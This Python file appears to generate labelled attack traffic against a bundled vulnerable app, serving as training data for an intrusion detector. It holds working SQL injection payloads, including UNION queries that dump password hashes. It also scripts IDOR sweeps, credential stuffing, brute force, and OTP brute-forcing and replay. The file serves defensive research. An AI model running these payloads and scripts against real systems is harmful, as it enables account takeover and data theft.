"""
Attack traffic generator -- Attack Round 1, the TRAINING corpus (spec §13
Phase 2, §7.2).

  *** THIS TOOL ATTACKS THE BUNDLED TARGET APPLICATION ONLY.        ***
  *** Point it at nothing else. See SAFETY.md.                      ***

Spec §7.2 is the load-bearing methodological rule of the whole project:
attack data is generated twice, in two rounds that are never mixed.

  round = train  (this file, Phase 2)   straightforward, documented attacks
                                         across all three categories; fits the
                                         suspicion meter and NOTHING else.
  round = eval   (Phase 7)              deliberately varied -- different tools,
                                         encodings and pacing -- reported
                                         results only, model already frozen.

So this generator produces the *straightforward, documented* attacks of round
1. It is intentionally not evasive: the evasion belongs to round 2, where the
point is to test a frozen model against techniques it never trained on. Using
the same evasive corpus for both would let the model memorise the tricks and
would make the evaluation meaningless (§7.2).

WHY IT ALSO COMPLETES THE 2x2
-----------------------------
The benign generators populate two cells of the automation×malice grid:
benign/human and benign/scripted. This file adds the other two, and the
second is the one §6.3's entire argument depends on:

  attack / scripted   fast, metronomic, no assets, tool User-Agent
  attack / human      a careful manual attacker: browser UA, fetches some
                      assets, slow and irregular -- barely automated, entirely
                      hostile. Nearly invisible on the automation axis, which
                      is exactly why a single combined score fails and two
                      scores are needed.

Every session is labelled at the point of generation (spec §7.3): the label,
including its ground truth, category, subcategory and automation class, is
written to the sidecar BEFORE the attack runs, so it is true by construction
rather than inferred afterwards from what the traffic looked like.
"""

from __future__ import annotations

import argparse
import random
import time
import uuid
from dataclasses import dataclass

import httpx

from adf.config import system
from adf.logstore import LabelSidecar
from adf.schema import PROVENANCE_HEADER
from target_app.otp import otp_for
from tools.benign_traffic import KNOWN_USERS, PAGE_ASSETS

GENERATOR_NAME = "attack_traffic.py"
GENERATOR_VERSION = "1.0"

# Tool-shaped User-Agents. Real attack tooling rarely bothers to impersonate a
# browser in a straightforward run, and the honest UA is itself an automation
# signal the meter is allowed to learn (spec §6.3). Round 2 will spoof these.
TOOL_USER_AGENTS = [
    "python-requests/2.32",
    "sqlmap/1.8.2#stable (https://sqlmap.org)",
    "curl/8.6.0",
    "Hydra/9.5",
    "Go-http-client/2.0",
]

# A browser UA for the manual attacker, who really is using a browser plus an
# intercepting proxy. Same pool the benign humans draw from, deliberately: the
# manual attacker must be indistinguishable from a real user on the UA feature.
BROWSER_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
]

# A compromised low-privilege account. The SQLi and IDOR attackers hold this:
# realistically, an attacker who can reach authenticated endpoints has already
# obtained one ordinary account (phished, reused password, insider) and is now
# escalating. Using a real seeded account keeps the attack traffic on the same
# endpoints a legitimate user reaches, so the two are separated by BEHAVIOUR
# rather than by which URLs exist.
FOOTHOLD = (1, "a.mirza", "Summer2024!")

# Passwords a credential attacker would try: a stock weak-password list plus a
# few of the real seeded passwords, so some attempts actually succeed and the
# corpus contains successful as well as failed credential attacks.
COMMON_PASSWORDS = [
    "123456", "password", "admin", "letmein", "qwerty", "welcome",
    "password1", "changeme", "root", "test", "Summer2024!", "hunter2",
]

USERNAMES = [u for _, u, _ in KNOWN_USERS] + ["administrator", "root", "test", "guest"]

# Straightforward, documented SQL injection payloads for the search box, one
# per subcategory. These are the textbook forms (spec §7.2 "straightforward,
# documented"); obfuscated and encoded variants are held back for round 2.
SQLI_PAYLOADS = {
    "sqli_error": [
        "'",                       # unbalanced quote -> verbose driver error
        "1' OR '1",
        "\"",
        "') OR ('1'='1",
    ],
    "sqli_boolean": [
        "x' OR '1'='1",            # always true
        "x' AND '1'='2",           # always false -- pair reveals boolean oracle
        "x' OR 1=1 -- ",
    ],
    "sqli_union": [
        "x' UNION SELECT 1,2,3,4 -- ",                                  # column count probe
        "x' UNION SELECT id, username, password_hash, role FROM users -- ",  # dump creds
        "x' UNION SELECT id, username, password_hash, role FROM users WHERE role='admin' -- ",
    ],
}


@dataclass
class AttackTiming:
    """Scripted attackers are metronomic; a manual attacker is not.

    `scripted=True` gives a tight, near-constant tick (fast tooling). Manual
    gives a broad lognormal like a human, because the manual attacker really
    is a human at a keyboard (spec §6.3)."""

    rng: random.Random
    scripted: bool = True

    def wait(self) -> float:
        if self.scripted:
            return self.rng.uniform(0.02, 0.09)          # ~50ms tick, low variance
        return max(0.3, self.rng.lognormvariate(mu=0.6, sigma=0.7))  # human-like, slow


class Attacker:
    """Base class: holds the client, timing, label, and helpers. Subclasses
    implement `attack()`."""

    #: overridden per subclass
    category = "unknown"
    subcategory = "unknown"

    def __init__(
        self,
        base_url: str,
        rng: random.Random,
        *,
        dwell: bool = True,
        scripted: bool = True,
        fetch_assets: bool = False,
    ) -> None:
        self.rng = rng
        self.dwell = dwell
        self.scripted = scripted
        self.fetch_assets = fetch_assets
        self.timing = AttackTiming(rng, scripted=scripted)
        self.session_id = f"attack-{uuid.uuid4().hex[:12]}"
        ua = rng.choice(TOOL_USER_AGENTS if scripted else BROWSER_USER_AGENTS)

        headers = {"User-Agent": ua, PROVENANCE_HEADER: self.session_id}
        if not scripted:
            # The manual attacker's browser sends the full ordered header set,
            # just like a real user -- another reason they are hard to catch on
            # the automation axis.
            headers.update({
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-GB,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
            })
        self.client = httpx.Client(base_url=base_url, follow_redirects=True, timeout=10.0, headers=headers)

    @property
    def label(self) -> dict:
        return {
            "ground_truth": "attack",
            "attack_category": self.category,
            "attack_subcategory": self.subcategory,
            "automation_label": "scripted" if self.scripted else "human",
            "generator": GENERATOR_NAME,
            "tool_version": GENERATOR_VERSION,
            "notes": f"round1 {self.subcategory} ({'scripted' if self.scripted else 'manual'})",
        }

    # -- helpers -----------------------------------------------------------

    def _pause(self) -> None:
        if self.dwell:
            time.sleep(self.timing.wait())

    def _get(self, path: str, **kwargs) -> httpx.Response:
        resp = self.client.get(path, **kwargs)
        # A manual attacker in a browser pulls assets; tools do not.
        if self.fetch_assets:
            for asset in PAGE_ASSETS:
                if self.rng.random() < 0.6:
                    self.client.get(asset)
        return resp

    def _login_foothold(self) -> bool:
        """Authenticate with the compromised account so authenticated attack
        surfaces (search, profile/record APIs) are reachable."""
        uid, username, password = FOOTHOLD
        self._get("/login")
        self._pause()
        self.client.post("/login", data={"username": username, "password": password})
        self._pause()
        self.client.post("/otp", data={"code": otp_for(uid)})
        self._pause()
        return True

    def attack(self) -> None:  # pragma: no cover - overridden
        raise NotImplementedError

    def run(self) -> None:
        try:
            self.attack()
        finally:
            self.client.close()

    def close(self) -> None:
        try:
            self.client.close()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# SQL injection (spec §6.1 search box; subcategories §schema)
# ---------------------------------------------------------------------------


class SqliAttacker(Attacker):
    category = "sqli"

    def __init__(self, *args, subcategory: str = "sqli_error", **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.subcategory = subcategory

    def attack(self) -> None:
        self._login_foothold()
        # A couple of benign-looking probes first, the way a real attacker maps
        # the endpoint before injecting. Keeps the malice score's rise gradual,
        # which is what makes accumulation (spec §6.4) the right model.
        self._get("/search", params={"q": self.rng.choice(["policy", "expense", "training"])})
        self._pause()

        payloads = list(SQLI_PAYLOADS[self.subcategory])
        self.rng.shuffle(payloads)
        # Scripted tools hammer many payloads; a manual attacker tries a few.
        n = len(payloads) if self.scripted else min(2, len(payloads))
        for payload in payloads[:n]:
            self._get("/search", params={"q": payload})
            self._pause()
            if self.scripted:
                # Tools re-fire slight mutations of a working payload.
                self._get("/search", params={"q": payload.replace("1", "2")})
                self._pause()


# ---------------------------------------------------------------------------
# IDOR (spec §6.1 sequential ids, no ownership check)
# ---------------------------------------------------------------------------


class IdorAttacker(Attacker):
    category = "idor"

    def __init__(self, *args, subcategory: str = "idor_sequential", **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.subcategory = subcategory

    def attack(self) -> None:
        self._login_foothold()

        if self.subcategory == "idor_sequential":
            # Walk profile ids and record ids in order -- the classic sweep.
            # The manual attacker walks a shorter range, by hand.
            hi = 12 if self.scripted else 5
            for pid in range(1, hi + 1):
                self._get(f"/api/profile/{pid}")
                self._pause()
            for rid in range(1, hi + 1):
                self._get(f"/api/records/{rid}")
                self._pause()
        else:  # idor_tamper
            # Jump around, tamper with references, probe out-of-range and
            # boundary ids rather than a clean ascending sweep.
            for pid in self.rng.sample(range(1, 13), k=min(8, 12)):
                self._get(f"/api/profile/{pid}")
                self._pause()
            for rid in (0, 999, 1, 50, -1 % 1000):
                self._get(f"/api/records/{rid}")
                self._pause()


# ---------------------------------------------------------------------------
# Auth attacks (spec §6.1 login + OTP)
# ---------------------------------------------------------------------------


class AuthAttacker(Attacker):
    category = "auth"

    def __init__(self, *args, subcategory: str = "auth_credential_stuffing", **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.subcategory = subcategory

    def attack(self) -> None:
        if self.subcategory == "auth_credential_stuffing":
            # Many (username, password) pairs, one attempt each -- the shape of
            # a stolen-credential replay. Mostly misses, as real stuffing does.
            pairs = [(self.rng.choice(USERNAMES), self.rng.choice(COMMON_PASSWORDS))
                     for _ in range(14 if self.scripted else 5)]
            # Seed exactly one valid pair into the list at a random position, so
            # every stuffing session lands one success among many failures (a
            # ~7% hit rate). Without this the success rate is left to chance and
            # some corpora would contain no successful stuffing at all, which is
            # a shape the meter should still see.
            pairs.insert(self.rng.randint(0, len(pairs)), (FOOTHOLD[1], FOOTHOLD[2]))
            for username, password in pairs:
                self._get("/login")
                self.client.post("/login", data={"username": username, "password": password})
                self._pause()

        elif self.subcategory == "auth_bruteforce":
            # One account, many passwords -- includes the real one, so the
            # attack succeeds partway through and the corpus has a successful
            # brute force in it.
            username = FOOTHOLD[1]
            pwlist = list(COMMON_PASSWORDS)
            if FOOTHOLD[2] not in pwlist:
                pwlist.append(FOOTHOLD[2])
            self.rng.shuffle(pwlist)
            for password in pwlist:
                self.client.post("/login", data={"username": username, "password": password})
                self._pause()

        elif self.subcategory == "auth_otp_bypass":
            # Reach the OTP stage with valid credentials, then brute the code.
            # The OTP is uncapped and never expires (spec §6.1), so this is a
            # genuine bypass, not a guess that gets locked out.
            uid, username, password = FOOTHOLD
            self.client.post("/login", data={"username": username, "password": password})
            self._pause()
            correct = otp_for(uid)
            guesses = [f"{self.rng.randint(0, 999999):06d}" for _ in range(9)]
            guesses.insert(self.rng.randint(0, len(guesses)), correct)  # eventually hits
            for code in guesses:
                self.client.post("/otp", data={"code": code})
                self._pause()

        else:  # auth_otp_reuse
            # Log in fully, capture the (reusable) code, then replay it in a
            # fresh session -- the reuse weakness made concrete.
            uid, username, password = FOOTHOLD
            self.client.post("/login", data={"username": username, "password": password})
            self._pause()
            code = otp_for(uid)
            self.client.post("/otp", data={"code": code})
            self._pause()
            replay = httpx.Client(base_url=str(self.client.base_url), follow_redirects=True,
                                  timeout=10.0, headers=dict(self.client.headers))
            try:
                replay.post("/login", data={"username": username, "password": password})
                replay.post("/otp", data={"code": code})   # same code, new session
            finally:
                replay.close()


# ---------------------------------------------------------------------------
# The careful MANUAL attacker (spec §6.3 "barely automated, extremely hostile")
# ---------------------------------------------------------------------------


class ManualAttacker(Attacker):
    """A human working through a browser and an intercepting proxy.

    Mixes a little of every category, slowly and irregularly, fetching assets
    like a real browser. This is the hardest positive in the corpus: on the
    automation axis it looks benign, so only the malice axis catches it. If the
    two-score model earns its place anywhere, it is here.
    """

    category = "sqli"        # primary flavour; the session touches all three
    subcategory = "recon"

    def attack(self) -> None:
        self._login_foothold()
        # slow recon: read a couple of pages first
        self._get("/dashboard")
        self._pause()
        self._get("/directory")
        self._pause()
        # a hand IDOR peek
        for pid in (2, 3, 7):
            self._get(f"/profile/{pid}")
            self._pause()
        # one careful SQL probe
        self._get("/search", params={"q": "O'Brien"})
        self._pause()
        self._get("/search", params={"q": "x' OR '1'='1"})
        self._pause()
        # a couple of API pokes
        self._get("/api/records/1")
        self._pause()
        self._get("/api/profile/9")
        self._pause()


# ---------------------------------------------------------------------------
# Profiles: (class, kwargs). Each entry is one attack shape the generator can
# emit; the mix is chosen so all three categories and both automation classes
# are represented.
# ---------------------------------------------------------------------------

PROFILES: dict[str, tuple[type, dict]] = {
    # scripted
    "sqli_error":       (SqliAttacker, {"subcategory": "sqli_error", "scripted": True}),
    "sqli_boolean":     (SqliAttacker, {"subcategory": "sqli_boolean", "scripted": True}),
    "sqli_union":       (SqliAttacker, {"subcategory": "sqli_union", "scripted": True}),
    "idor_sequential":  (IdorAttacker, {"subcategory": "idor_sequential", "scripted": True}),
    "idor_tamper":      (IdorAttacker, {"subcategory": "idor_tamper", "scripted": True}),
    "cred_stuffing":    (AuthAttacker, {"subcategory": "auth_credential_stuffing", "scripted": True}),
    "bruteforce":       (AuthAttacker, {"subcategory": "auth_bruteforce", "scripted": True}),
    "otp_bypass":       (AuthAttacker, {"subcategory": "auth_otp_bypass", "scripted": True}),
    "otp_reuse":        (AuthAttacker, {"subcategory": "auth_otp_reuse", "scripted": True}),
    # manual (human, hostile) -- the §6.3 cell
    "manual_sqli":      (SqliAttacker, {"subcategory": "sqli_boolean", "scripted": False, "fetch_assets": True}),
    "manual_idor":      (IdorAttacker, {"subcategory": "idor_sequential", "scripted": False, "fetch_assets": True}),
    "manual_recon":     (ManualAttacker, {"scripted": False, "fetch_assets": True}),
}

#: A balanced default mix across categories and automation classes.
DEFAULT_MIX = [
    "sqli_error", "sqli_boolean", "sqli_union",
    "idor_sequential", "idor_tamper",
    "cred_stuffing", "bruteforce", "otp_bypass", "otp_reuse",
    "manual_sqli", "manual_idor", "manual_recon",
]


def generate(
    *,
    base_url: str,
    sessions: int,
    seed: int,
    round: str,
    run_id: str,
    label_path: str,
    dwell: bool,
    mix: list[str],
) -> dict[str, int]:
    rng = random.Random(seed)
    sidecar = LabelSidecar(label_path)
    counts: dict[str, int] = {}

    for i in range(sessions):
        profile = mix[i % len(mix)]
        cls, kwargs = PROFILES[profile]
        attacker = cls(base_url, random.Random(rng.random()), dwell=dwell, **kwargs)

        # Labelled before acting (spec §7.3).
        sidecar.write(session_id=attacker.session_id, round=round, run_id=run_id, **attacker.label)
        try:
            attacker.attack()
        finally:
            attacker.close()

        counts[profile] = counts.get(profile, 0) + 1
        if (i + 1) % 12 == 0:
            print(f"  ... {i + 1}/{sessions} attack sessions")

    return counts


def main() -> None:
    cfg = system()
    ap = argparse.ArgumentParser(description="Generate labelled attack traffic -- Round 1 (spec §7.2, Phase 2).")
    ap.add_argument("--base-url",
                    default=f"http://{cfg.get('network.bind_host','127.0.0.1')}:{cfg.get('network.target_port',8001)}")
    ap.add_argument("--sessions", type=int, default=60)
    ap.add_argument("--seed", type=int, default=cfg.seed + 2)
    # Round 1 is `train`. The generator refuses `eval` by default: round 2 must
    # use genuinely different techniques (§7.2), not a rerun of this straight
    # corpus, and gating it here stops that mistake from being one flag away.
    ap.add_argument("--round", choices=["dev", "train", "calibrate"], default="train",
                    help="round 1 training corpus; `eval` is intentionally NOT accepted here (spec §7.2)")
    ap.add_argument("--run-id", default=f"attack-{uuid.uuid4().hex[:8]}")
    ap.add_argument("--label-path", default=str(cfg.label_dir / "attack_labels.jsonl"))
    ap.add_argument("--mix", default=",".join(DEFAULT_MIX),
                    help="comma-separated attack profiles to cycle through")
    ap.add_argument("--no-dwell", action="store_true",
                    help="skip pacing for a fast smoke run (timing features will be unrealistic)")
    args = ap.parse_args()

    mix = [p.strip() for p in args.mix.split(",") if p.strip()]
    unknown = set(mix) - set(PROFILES)
    if unknown:
        raise SystemExit(f"unknown profile(s): {sorted(unknown)}; choose from {sorted(PROFILES)}")

    print(f"*** ATTACK GENERATOR -- targets the bundled app only: {args.base_url} ***")
    print(f"generating {args.sessions} attack sessions, round={args.round}")
    print(f"mix: {', '.join(mix)}")
    counts = generate(
        base_url=args.base_url,
        sessions=args.sessions,
        seed=args.seed,
        round=args.round,
        run_id=args.run_id,
        label_path=args.label_path,
        dwell=not args.no_dwell,
        mix=mix,
    )
    print("done: " + ", ".join(f"{v} {k}" for k, v in sorted(counts.items())))


if __name__ == "__main__":
    main()
